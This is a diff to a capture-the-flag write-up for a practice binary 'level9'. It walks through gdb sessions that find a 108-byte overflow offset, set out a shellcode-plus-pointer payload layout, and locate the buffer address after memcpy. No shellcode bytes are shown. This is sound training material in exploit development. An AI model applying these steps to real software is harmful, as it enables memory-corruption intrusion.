@@ -11,17 +11,19 @@ python -c "import sys
 for i in range(97, 130): sys.stdout.write(chr(i) * 4)" > /tmp/lvl9
 
 gdb level9
-r `cat /tmp/lvl9`
-=> segfault at 0x08048682
-info reg
-=> eax            0x7c7c7c7c
+(gdb) r `cat /tmp/lvl9`
+segfault at 0x08048682
+(gdb) info reg
+eax            0x7c7c7c7c
+
 0x7c = 124, (124 - 97) * 4 = 108
 
 Check if it is valid:
-r `python -c "print 'a' * 108 + 'bbbb'"`
-=> segfault
-info reg
-=> eax            0x62626262
+(gdb) r `python -c "print 'a' * 108 + 'bbbb'"`
+segfault
+(gdb) info reg
+eax            0x62626262
+
 0x62 = 'b', the offset is 108.
 
 So out exploit string will be: <pointer to shellcode> + <shellcode> + <padding to get a total of 108 bytes> + <pointer to the start of the string>
@@ -32,11 +34,11 @@ We still need to find the adress of the start of the string.
 The adress is returned by memcpy, so we just need to examine $eax after the call.
 
 gdb level9
-b *0x08048738
-r abcdefgh
-info reg
-=> eax            0x804a00c
-x/s $eax
+(gdb) b *0x08048738
+(gdb) r abcdefgh
+(gdb) info reg
+eax            0x804a00c
+(gdb) x/s $eax
 0x804a00c:	 "abcdefgh"
 
 The string is at 0x804a00c, so our shellcode will be at 0x804a010 (0x804a00c + 4 bytes)
